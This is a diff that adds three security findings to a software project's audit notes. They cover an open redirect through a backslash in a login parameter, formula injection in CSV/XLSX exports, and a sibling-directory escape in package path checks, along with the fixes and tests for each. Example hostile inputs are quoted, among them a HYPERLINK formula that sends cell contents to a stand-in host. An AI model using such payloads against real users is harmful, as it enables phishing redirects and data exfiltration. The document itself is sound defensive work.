@@ -115,6 +115,46 @@ machine endpoints for HTML: `/concurrency/api/metrics` sits under a blueprint
 with a non-`/api` prefix, which is how a "pages render without inline script"
 test ended up booting a multiprocessing manager.
 
+### 1.8 The sign-in redirect refused `/\evil.example` only by accident
+
+`/auth/login?next=...` carried the page to return to after signing in, checked
+with "starts with `/` and not with `//`". A *backslash* walks straight through
+that: every browser normalises `\` to `/` before resolving a URL, so
+`next=/\evil.example` becomes `//evil.example`. Percent-encoding does not help —
+`%5C` is decoded first. The user signs in on the real application and is handed
+to somebody else's site.
+
+One function now decides (`Api/routes/auth.py::_safe_next_url`): same-origin
+path, no backslash (raw or decoded), no control characters — used by both the
+form and the JSON branch. `tests/security/test_login_redirect.py` pins the
+hostile values, the safe ones, and the end-to-end 302.
+
+### 1.9 A document line starting with `=` ran in the reviewer's spreadsheet
+
+Two exports wrote cells without the neutralisation two others already apply. The
+search-results export (CSV **and** XLSX) wrote `line_text` and `context_before` —
+the *content of ingested documents* — plus `file_name`/`file_path` from the
+operator's disk; a corpus can legitimately contain
+`=HYPERLINK("https://example.invalid/?d="&A1,"open")`. The keyword export wrote a
+user-typed keyword the same way.
+
+Every cell in both writers now goes through one helper
+(`_safe_cell` → `spreadsheet_safe_text`), so the CSV and Excel exports cannot
+disagree, and `tests/security/test_csv_injection.py` pins the helper, both search
+exports and a hostile filename.
+
+### 1.10 "startswith" is not "inside" for a map package path
+
+`services/map_packages.py` asked whether an archive member or a manifest-named
+file stayed inside the package with `str(path).startswith(str(root))`. That
+accepts a sibling whose name merely begins with the root's — `../pkg_evil/x` from
+an archive, or a manifest field pointing there — and `installed_pmtiles_path` /
+`raster_tile_path` serve whatever the manifest names over HTTP, so the escape has
+a network edge to it. `Path.is_relative_to` compares components, which is what
+the check meant; `tests/unit/test_map_package_paths.py` pins the sibling case for
+both archive formats, keeps an ordinary archive extracting, and shows a manifest
+cannot reach a neighbouring package.
+
 ---
 
 ## 2. Items that were investigated and deliberately not "fixed"
@@ -179,7 +219,7 @@ suggested "fix" would have introduced the bug.
 |---|---|---|
 | `tests/unit` | 3931 collected, 2 failed | both `test_licensing`, environment only |
 | `tests/integration` | 1494 collected, 4 failed, 0 errors | all four are §2.1 |
-| `tests/security` | 384, 0 failed | |
+| `tests/security` | 411, 0 failed | 384 before this round's three security findings |
 | `tests/e2e` | 23, 0 failed | |
 | `tests/js/*.mjs` | 22 harnesses pass | `reports_page_smoke.mjs` is a documented xfail; `action_lifecycle_smoke.mjs` needs the rendered-dialog argument its Python test supplies |
 | `verify_readiness.py` | 31 checks, 1 warn, 0 critical → READY | warn = dev server / no reverse proxy, by design in this environment |
